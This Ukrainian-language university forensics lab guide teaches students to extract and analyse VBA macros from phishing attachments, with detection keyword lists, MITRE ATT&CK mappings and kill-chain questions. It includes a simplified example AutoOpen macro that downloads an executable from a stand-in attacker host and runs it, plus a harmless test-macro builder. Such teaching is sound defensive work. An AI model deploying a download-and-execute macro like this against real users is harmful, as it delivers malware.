# Лабораторна робота — Сценарій 06b: Аналіз VBA макросів у фішингових вкладеннях

Назва лабораторної: Macro Forensics — Office Document Malware Analysis
Модуль: Цифрова криміналістика / Document Forensics
Сценарій: 06b (продовження SC06)
Формат: Self-Paced
Версія документу: 1.0

---

> **Передумова:** Перед виконанням цієї лаби необхідно пройти **SC06 — Аналіз структури електронної пошти**. У SC06 ти виявив підозрілий лист `06_malware_invoice.eml` з вкладенням. У цій лабі ми досліджуємо що міститься всередині цього вкладення.

---

## Мета

Навчитися виявляти та аналізувати VBA макроси у документах Word та Excel з форензік-перспективи. Зрозуміти як зловмисники використовують макроси для виконання шкідливого коду при відкритті документа та які артефакти вони залишають.

---

## Теоретична частина

### Що таке VBA макрос у контексті атаки

VBA (Visual Basic for Applications) — мова скриптів вбудована в Microsoft Office. Легітимно використовується для автоматизації. Зловмисники зловживають нею для:

```
Жертва отримує email
    → Відкриває вкладення invoice.doc
        → "Для перегляду документа увімкніть макроси"
            → Жертва натискає Enable Content
                → Макрос виконується
                    → Завантажує payload / відкриває backdoor
```

### Анатомія шкідливого макросу

```vba
' Типовий шкідливий макрос (спрощено — для навчання)
Sub AutoOpen()                          ' AutoOpen = запускається автоматично
    Dim url As String
    url = "http://attacker.com/stage2.exe"

    Dim path As String
    path = Environ("TEMP") & "\svchost.exe"

    ' Завантажує файл з інтернету
    CreateObject("MSXML2.XMLHTTP").Open "GET", url, False

    ' Записує на диск
    CreateObject("ADODB.Stream").SaveToFile path

    ' Виконує
    Shell path
End Sub
```

### Автоматичні точки запуску макросів (AutoExec)

| Назва | Коли виконується |
|---|---|
| `AutoOpen` | При відкритті документа |
| `AutoClose` | При закритті документа |
| `AutoNew` | При створенні нового документа |
| `Document_Open` | При відкритті (альтернатива AutoOpen) |
| `Workbook_Open` | В Excel при відкритті книги |

> ⚠ Наявність цих функцій у макросі — перший сигнал підозри.

### Підозрілі функції та виклики

| Функція / об'єкт | Що робить |
|---|---|
| `Shell` | Запускає зовнішню програму |
| `CreateObject("WScript.Shell")` | Доступ до командного рядка |
| `CreateObject("MSXML2.XMLHTTP")` | HTTP запити (завантаження) |
| `CreateObject("ADODB.Stream")` | Запис файлів на диск |
| `Environ("TEMP")` | Шлях до тимчасової папки |
| `Chr(...)` | Обфускація рядків через ASCII коди |
| `Base64` декодування | Прихований payload |

### MITRE ATT&CK відображення

| Технніка | ID | Опис |
|---|---|---|
| VBA | T1059.005 | Виконання коду через Visual Basic |
| Phishing Attachment | T1566.001 | Доставка через вкладення |
| User Execution | T1204.002 | Вимагає дій користувача (Enable Macros) |
| Ingress Tool Transfer | T1105 | Завантаження інструментів з мережі |

---

## Підготовка — Тестовий документ з макросом

> 📌 **Для викладача:** Підготувати тестовий `.docm` файл з безпечним макросом для аналізу. Студенти НЕ запускають його — тільки аналізують.

**Створити тестовий документ (виконує викладач):**

```powershell
# Створити Word документ з тестовим макросом (БЕЗПЕЧНИЙ — тільки для навчання)
$Word = New-Object -ComObject Word.Application
$Word.Visible = $false
$Word.AutomationSecurity = "msoAutomationSecurityForceDisable"

$Doc = $Word.Documents.Add()

# Додати тестовий макрос
$Module = $Doc.VBProject.VBComponents.Add(1)  # vbext_ct_StdModule
$Module.Name = "MaliciousModule"
$Module.CodeModule.AddFromString(@"
Sub AutoOpen()
    ' SC06b TEST MACRO - NOT MALICIOUS
    Dim url As String
    url = "hxxp://cdn-updates-service.com/stage2.exe"
    MsgBox "SC16 Test: AutoOpen triggered. URL: " & url
End Sub

Sub DownloadAndExecute()
    Dim path As String
    path = Environ("TEMP") & "\update.exe"
    Shell "cmd.exe /c echo test > " & path
End Sub
"@)

$SavePath = "$env:USERPROFILE\Desktop\SC06b_test_invoice.docm"
$Doc.SaveAs($SavePath, 13)  # 13 = wdFormatXMLDocumentMacroEnabled
$Doc.Close()
$Word.Quit()
Write-Host "Тестовий документ збережено: $SavePath" -ForegroundColor Green
```

---

## Фаза 1 — Ручний аналіз через редактор VBA

### Крок 1.1 — Відкрити документ з ВИМКНЕНИМИ макросами

> ⚠ **ВАЖЛИВО:** Ніколи не натискати "Enable Content" / "Увімкнути вміст" при аналізі підозрілого документа!

1. Відкрий `SC06b_test_invoice.docm` у Word
2. Коли з'явиться жовте попередження — **НЕ натискай Enable Content**
3. Макроси залишаться вимкнені — документ безпечний для перегляду

### Крок 1.2 — Відкрити редактор VBA

```
Alt + F11 → відкриється Visual Basic Editor
```

У лівій панелі **Project Explorer** знайди:
- `Modules` → тут зберігається код макросів
- `ThisDocument` / `Sheet1` → можуть містити приховані обробники подій

### Крок 1.3 — Задокументувати знахідки

Для кожного модуля заповни:

| Поле | Значення |
|---|---|
| Назва модуля | |
| Функції що знайдено | |
| Чи є AutoOpen / AutoExec? | Так / Ні |
| Підозрілі виклики | |
| Обфускація (Chr, Base64)? | Так / Ні |
| Знайдені URL або шляхи | |

---

## Фаза 2 — Аналіз через PowerShell (без відкриття Word)

### Крок 2.1 — Витягти макрос без запуску документа

```powershell
$DocPath = "$env:USERPROFILE\Desktop\SC06b_test_invoice.docm"

# Відкрити з ForceDisable — макроси НЕ виконуються
$Word = New-Object -ComObject Word.Application
$Word.Visible = $false
$Word.AutomationSecurity = "msoAutomationSecurityForceDisable"

$Doc = $Word.Documents.Open($DocPath, $false, $true)  # ReadOnly

# Вивести всі модулі та код
foreach ($Component in $Doc.VBProject.VBComponents) {
    $Lines = $Component.CodeModule.CountOfLines
    if ($Lines -gt 0) {
        Write-Host "`n=== Модуль: $($Component.Name) ===" -ForegroundColor Cyan
        Write-Host $Component.CodeModule.Lines(1, $Lines) -ForegroundColor Yellow
    }
}

$Doc.Close($false)
$Word.Quit()
```

### Крок 2.2 — Пошук підозрілих патернів у коді

```powershell
$MacroCode = @"
[код макросу що ти скопіював з Кроку 2.1]
"@

# Перевірити наявність підозрілих функцій
$Suspicious = @('Shell','CreateObject','AutoOpen','AutoClose','Document_Open',
                'XMLHTTP','ADODB','Environ','WScript','PowerShell','cmd.exe')

foreach ($Pattern in $Suspicious) {
    if ($MacroCode -match $Pattern) {
        Write-Host "[!!!] Знайдено: $Pattern" -ForegroundColor Red
    }
}
```

---

## Фаза 3 — Автоматизований аналіз через SC_Macro_Forensics.ps1

> 📄 Скрипт: [lab_scripts/SC_Macro_Forensics.ps1](../lab_scripts/SC_Macro_Forensics.ps1)

### Крок 3.1 — Запустити скрипт

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
.\SC_Macro_Forensics.ps1
```

Скрипт автоматично:
- Сканує всі диски на `.doc`, `.docm`, `.xls`, `.xlsm`
- Знаходить документи з VBA макросами
- Експортує код кожного макросу у `.vba` файл
- Генерує CSV звіт — без змін оригінальних файлів

### Крок 3.2 — Дослідити exported макроси

Відкрий папку `ExtractedMacros` на Робочому столі та знайди файл `MaliciousModule_SC06b_test_invoice.vba`.

```powershell
# Пошук підозрілих рядків у всіх .vba файлах
$MacroFolder = Get-ChildItem "$env:USERPROFILE\Desktop\*_Macro_Forensics\ExtractedMacros" -Directory |
    Select-Object -First 1

Get-ChildItem $MacroFolder.FullName -Filter *.vba | ForEach-Object {
    $Content = Get-Content $_.FullName -Raw
    $Hits = @()
    @('Shell','CreateObject','AutoOpen','XMLHTTP','ADODB','http','Environ') | ForEach-Object {
        if ($Content -match $_) { $Hits += $_ }
    }
    if ($Hits) {
        Write-Host "[!!!] $($_.Name): $($Hits -join ', ')" -ForegroundColor Red
    }
}
```

---

## Фаза 4 — Зв'язок з SC06 (Email → Attachment)

### Крок 4.1 — Відновити ланцюг атаки

У SC06 ти вже аналізував `06_malware_invoice.eml`. Тепер з'єднай знахідки:

```
ЛАНЦЮГ АТАКИ:

[SC06] Email заголовки:
  From:     finance@legitcorp.co (підроблений)
  Reply-To: finance-dept@proton.me (підозрілий)
  Subject:  Invoice #2024-Q4-7823

[SC06] Email IoC:
  URL в href:    cdn-updates-service.com     ← підроблений
  Tracking pixel: cdn-updates-service.com/track/pixel.gif

[SC06b] Вкладення IoC:
  Файл:      invoice_Q4.docm
  Макрос:    AutoOpen() → Shell() → cmd.exe
  URL в коді: cdn-updates-service.com/stage2.exe  ← той самий домен!
```

### Крок 4.2 — Кореляція IoC

```
Відповідь на питання:

1. Який IoC з SC06 (email) співпадає з IoC з SC06b (макрос)?

2. Що означає що email і макрос використовують той самий домен?

3. Яка послідовність дій зловмисника (Kill Chain)?
   - Крок 1: _________________ (Delivery)
   - Крок 2: _________________ (Exploitation)
   - Крок 3: _________________ (Installation)

4. Чому жертва могла не помітити підозрілий макрос?
```

---

## Фаза 5 — Збереження результатів

```powershell
$OutputDir = "C:\forensics_results\SC06b"
New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null

# Скопіювати результати скрипту
$MacroResults = Get-ChildItem "$env:USERPROFILE\Desktop\*_Macro_Forensics" |
    Sort-Object LastWriteTime -Descending | Select-Object -First 1
Copy-Item $MacroResults.FullName -Destination $OutputDir -Recurse

Write-Host "Збережено у: $OutputDir" -ForegroundColor Green
```

### Написати висновок:

```
АНАЛІЗ VBA МАКРОСІВ — SC06b
==============================
Дата:      [сьогоднішня дата]
Студент:   [твоє ім'я]
Файл:      SC06b_test_invoice.docm

Знайдені модулі: [N]
AutoExec функції: AutoOpen / Document_Open / інше

Підозрілі виклики:
  [ ] Shell
  [ ] CreateObject
  [ ] XMLHTTP (мережевий запит)
  [ ] ADODB (запис на диск)

IoC знайдені:
  URL:   hxxp://cdn-updates-service.com/stage2.exe
  Path:  %TEMP%\update.exe

Зв'язок з SC06:
  Той самий домен cdn-updates-service.com використаний
  як у посиланні фішингового листа так і в коді макросу.

MITRE ATT&CK: T1059.005, T1566.001, T1204.002
```

---

## Чеклист для самоперевірки

```
[ ] Документ відкрито БЕЗ увімкнення макросів
[ ] VBA Editor відкрито (Alt+F11)
[ ] Всі модулі задокументовано
[ ] AutoExec функції знайдено та проаналізовано
[ ] Підозрілі виклики ідентифіковано
[ ] PowerShell аналіз виконано
[ ] SC_Macro_Forensics.ps1 запущено
[ ] .vba файли в ExtractedMacros перевірено
[ ] Кореляція з IoC з SC06 виконана
[ ] Ланцюг атаки відновлено
[ ] Висновок написано
```

---

*ITS/КСЗІ — Macro Forensics Lab | Сценарій 06b | ТІЛЬКИ ДЛЯ НАВЧАННЯ | SET University*
